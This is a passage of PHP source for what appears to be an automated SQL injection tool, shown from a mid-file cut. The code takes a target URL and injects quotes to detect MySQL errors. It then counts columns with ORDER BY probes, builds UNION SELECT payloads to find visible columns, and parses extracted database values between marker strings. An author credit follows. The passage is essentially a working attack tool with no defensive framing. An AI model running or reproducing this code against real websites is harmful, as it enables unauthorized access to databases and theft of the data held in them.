													return $linkss;
									}
	function Get_Db_Access($db_access,$select_link,$fetch_digit)
	{
	$db = $_GET['db'];
	if(isset($db))
	{
		$execute_table = $db;
		
		$select_link_exec = $select_link;
		$add_digit = $fetch_digit;

			$rep_quote_link = preg_replace("/\binject\b/i", "'", $select_link_exec); // Add Single Quote 
			print $select_link_exec."</br>";
			$html = file_get_contents($rep_quote_link) or die("Could not access file7: $rep_quote_link <br>"); // Execute Single Quote 
			if (preg_match("/\bYou\shave\san\serror\sin\syour\sSQL\ssyntax\b/i", $html) or $t==0) // Detect Sql Error 
	 		{
				$injec_link = preg_replace(" /'/ ", "-$add_digit+link", $rep_quote_link); // Add One Digit 
							for ($i=1; $i<=6; $i++)
								{
								$orderby_add = preg_replace("/\blink\b/i", "Order+by+$i", $injec_link);
								$html_op_2 = file_get_contents($orderby_add) or die("Could not access file8: $injec_link <br>");
									if (preg_match("/\bUnknown\scolumn\b/i", $html_op_2)) // Finding Column Count 
											{
											$j=$i-1;
											print $j;
											goto end; 
											}
									}// For Loop Ending 
							end:
							$union_link = preg_replace(" /'/ ", "-$add_digit+Union+select+", $rep_quote_link); // Add One Digit 
							for($k=1; $k<=$j; $k++)
								{
									$union_link = $union_link . '7777'.$k . ','; // adding 7777 to URL
								}
								$union_link = substr($union_link,0,strlen($union_link)-1);
								
								$html_op_3 = file_get_contents($union_link) or die("Could not access file9: $union_link <br>");
								if (strpos($html_op_3,'7777')) // finding Visible                                   Col 								
      								{
										$col_visible = strpos($html_op_3,"7777");  // Searching For Visible Coloumn 
										$visible = substr($html_op_3,$col_visible+4);
										$remove_7777 = ereg_replace("[^0-9]", "", $visible );  // removing all Crap alphabet 
										$working_col = substr($remove_7777,-5);
										//print $working_col."Yah00oo";
									}
								else 
									{
									print "Nothing working !!!"; 
									}											
					}
					


	
		}
	}
					function Curr_DB($output_var)
									{
										$html_op = $output_var;
										$g=1;
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															return $parsed;
														} 
												else
														{
															echo "<center><br><br>Nothing Found OR Finished</center>";
															break;
														}
												}
										}
							function DB_Count($output_var)
									{
										$html_op = $output_var;
										$g=1;
										while($g == 1)
											{
 												$string1 = strpos($html_op,"sandeep");
											  	$string2 = strpos($html_op,"sandeep1");
												if( ($string1 > 1)  && ($string2 >1 ) )
														{
															$txt_between = substr($html_op,$string1,$string2+13);
															$html_op = substr($html_op,$string2+13);
															$start ="sandeep:";
															$end =":sandeep1";
															$txt_between = " ".$txt_between;
															$ini = strpos($txt_between,$start);
															if ($ini == 0) return "";
															$ini += strlen($start);
															$len = strpos($txt_between,$end,$ini) - $ini;
															$parsed= substr($txt_between,$ini,$len);
															return $parsed;
														} 
												else
														{
															echo "<center><br><br>Nothing Found OR Finished</center>";
															break;
														}
												}
										}
	

?>

<pre>
Author : [S]
Email : lakhan002@gmail.com
If you're modifying this code then please give credit to the original author [S] </pre>
